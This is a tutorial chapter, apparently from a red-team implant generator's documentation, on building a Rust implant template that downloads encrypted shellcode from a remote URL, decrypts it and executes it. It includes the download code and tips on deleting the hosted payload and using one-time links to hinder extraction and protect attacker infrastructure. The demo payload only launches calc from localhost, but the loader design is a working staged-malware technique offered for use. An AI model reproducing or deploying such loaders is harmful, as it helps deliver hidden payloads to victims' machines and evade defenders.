# Remote Type

In this chapter, we will create a plugin of type `Remote`.

The shellcode of a plugin of type `Remote` is hosted on a remote server. By controlling the accessibility of the shellcode, it can be made more difficult to extract the shellcode, thereby protecting the infrastructure.

For example, delete the remote shellcode file after the implant has run successfully. (provided you don't have other implants that depend on this shellcode file to run)

It is recommended to always use one-time linking (a unique hosting address for each generated final implant).

## Creating a binary implant template

We will modify the [code from the previous chapter](https://github.com/pumpbin/pumpbin/tree/main/examples/create_thread_encrypt)

First, we need a way to fetch the encrypted shellcode file from the remote server instead of including the shellcode placeholder data in the binary implant template.

Delete build.rs (no longer needed to generate shellcode placeholder data).

Add the dependency at the end of Cargo.toml. In this example, the http protocol is used for demonstration purposes. (You can use any protocol, and any method to implement the download function. PumpBin does not care. PumpBin is very flexible.)

```toml
reqwest = { version = "0.12.5", features = ["blocking"] }
```

Add the following download function to the main function of main.rs

```rust
fn download() -> Vec<u8> {
    const URL: &[u8; 81] =
        b"$$UURRLL$$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    let url = CStr::from_bytes_until_nul(URL).unwrap();
    reqwest::blocking::get(url.to_str().unwrap())
        .unwrap()
        .bytes()
        .unwrap()
        .to_vec()
}
```

$$UURRLL$$ is a `Prefix`, which means that the URL constant will be filled with valid data + random data, so it is recommended to reserve a certain number of bytes for PumpBin to fill with random bytes.

Since URLs and the like are mostly printable characters, the processing here is slightly different from the $$$SHELLCODE$$ `Prefix` in Chapter 1.

We no longer need a size holder to distinguish between valid data and invalid data. Instead, PumpBin will add a \\x00 byte after the valid data to locate the valid data.

This is easy to implement in Rust, and should be similar in other languages. If not, just use a for loop to check byte by byte.

After implementing the download function, we need to use it in main.rs to replace the shellcode placeholder data

Delete the first four lines of the main function in main.rs and add the following code to the first line

```rust
let shellcode = download();
let shellcode = shellcode.as_slice();
```

The modified main function is as follows

```rust
fn main() {
    let shellcode = download();
    let shellcode = shellcode.as_slice();
    let shellcode = decrypt(shellcode);
    let shellcode_size = shellcode.len();
    ...
```

Compiling the modified `create_thread` project, we will get a binary implant template that uses the http protocol to download the encrypted shellcode file.

```sh
cargo b -r
```

## Creating a Plugin

Use PumpBin Maker to create a plugin, similar to the previous section.

Prefix: Enter `$$UURRLL$$`

MaxLen: the length of the URL constant array reference 81.

Type: Select `Remote`

The rest is the same as the previous chapter

## Test Plugin

Use PumpBin to install the plugin you created, click the Encrypt button, select `w64-exec-calc-shellcode-func` to generate an encrypted shellcode file.

Use Python 3 to start an HTTP service in the same directory as the encrypted shellcode file.

```sh
python -m http.server 8000
```

The local http address of the encrypted shellcode file should be `http://127.0.0.1:8000/shellcode.enc`

Fill in PumpBin, generate the final implant, run it and you should see the access request, and the calc program is started.

At this point, the basic chapter is over. I have deliberately emphasized that PumpBin is very flexible! You can already see this in the basic chapter.
The following chapters will introduce some advanced techniques that build on PumpBin's high flexibility.

The complete project files for this example are available in the PumpBin code repository under [examples/create_thread_remote](https://github.com/pumpbin/pumpbin/blob/main/examples/create_thread_remote/src/main.rs).
